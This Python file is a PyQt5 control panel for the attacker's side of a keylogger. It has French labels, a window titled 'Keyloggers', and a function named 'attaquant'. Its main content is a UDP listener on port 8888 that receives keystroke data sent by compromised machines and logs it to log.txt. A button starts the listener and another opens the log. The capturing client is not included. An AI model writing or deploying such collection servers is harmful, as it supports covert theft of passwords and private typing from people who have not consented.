
from PyQt5 import QtCore, QtGui, QtWidgets
import socket, logging
import subprocess
 


class Ui_MainWindow(object):
        
    def action(self):
            projectpath = 'log.txt'
            subprocess.check_call( ('start',projectpath) , shell=True )

    def action2(self):
                attaquant()
            
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(797, 449)
        MainWindow.setStyleSheet("background:rgb(85, 170, 255);")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.ButtonChiffrement = QtWidgets.QPushButton(self.centralwidget)
        self.ButtonChiffrement.setGeometry(QtCore.QRect(130, 210, 181, 131))
        self.ButtonChiffrement.setStyleSheet("font: 75 9pt \"MS Shell Dlg 2\";\n"
"color:white;\n"
"background:rgb(85, 85, 255);")
        self.ButtonChiffrement.setObjectName("ButtonChiffrement")
        self.ButtonChiffrement.clicked.connect(self.action2)
        self.ButtonLogs = QtWidgets.QPushButton(self.centralwidget)
        self.ButtonLogs.setGeometry(QtCore.QRect(490, 210, 181, 131))
        self.ButtonLogs.setStyleSheet("font: 75 9pt \"MS Shell Dlg 2\";\n"
"color:white;\n"
"background:rgb(33, 127, 208);")
        self.ButtonLogs.setObjectName("ButtonLogs")
        self.ButtonLogs.clicked.connect(self.action)
        self.frame_2 = QtWidgets.QFrame(self.centralwidget)
        self.frame_2.setGeometry(QtCore.QRect(110, 30, 531, 101))
        self.frame_2.setStyleSheet("background:white;")
        self.frame_2.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_2.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_2.setObjectName("frame_2")
        self.frame_3 = QtWidgets.QFrame(self.frame_2)
        self.frame_3.setGeometry(QtCore.QRect(20, 10, 491, 80))
        self.frame_3.setStyleSheet("background:rgb(85, 170, 255);")
        self.frame_3.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_3.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_3.setObjectName("frame_3")
        self.label = QtWidgets.QLabel(self.frame_3)
        self.label.setGeometry(QtCore.QRect(170, 20, 141, 41))
        self.label.setStyleSheet("color:white;\n"
"font: 16pt \"MS Shell Dlg 2\";")
        self.label.setObjectName("label")
        MainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.ButtonChiffrement.setText(_translate("MainWindow", "En écoute"))
        self.ButtonLogs.setText(_translate("MainWindow", "Ouvrir les logs"))
        self.label.setText(_translate("MainWindow", "Keyloggers"))

def attaquant():
    host = "192.168.56.1" # adresse du serveur (remplacer par l'ip externe)
    port = 8888 # port d'écoute du serveur

    file = "log.txt" # nom du fichier de logs 
    logging.basicConfig(filename=file, level=logging.INFO, format="%(asctime)s %(message)s") # configuration du logger


    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock: # ouverture du soclet UDP
        sock.bind((host, port)) # écoute du port du serveur

        if sock:
            print("Socket créé !\r\nEn attente d'événements...")

            while True: # boucle infinie pour écouter les données entrantes
                d = sock.recvfrom(1024) # réception des données.
                data = d[0].decode('utf-8') # décodage du message reçu en utf-8
                addr = d[1] # adresse du client (non utilisée ici)

                if data: # si le message n'est pas vide
                    logging.info(data) # on écrit le message dans le fichier de logs
                    print(f"Reçu: {data}") # on affiche le message dans la console

if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
